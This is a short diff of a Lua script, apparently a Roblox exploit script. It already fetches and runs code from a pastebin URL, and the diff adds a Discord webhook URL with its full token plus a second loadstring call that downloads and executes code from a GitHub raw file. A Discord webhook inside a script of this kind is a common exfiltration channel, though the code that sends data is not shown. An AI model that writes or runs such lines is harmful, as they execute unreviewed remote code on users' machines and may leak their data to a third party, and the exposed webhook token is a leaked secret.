@@ -112,4 +112,5 @@ loadstring(game:HttpGet("https://pastebin.com/raw/ggsRCZD4", true))()
     end
 end)
 
-
+local webhook = "https://discord.com/api/webhooks/1218966940350021763/LbsWoOXsFlZZDYvKXslHYwCtv36MljgZmfn3YRWNy_Mp_EQY_FT3_NGb6LEpBNu7tbFp"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Coblyez/scripts/main/fun%20thing"))()
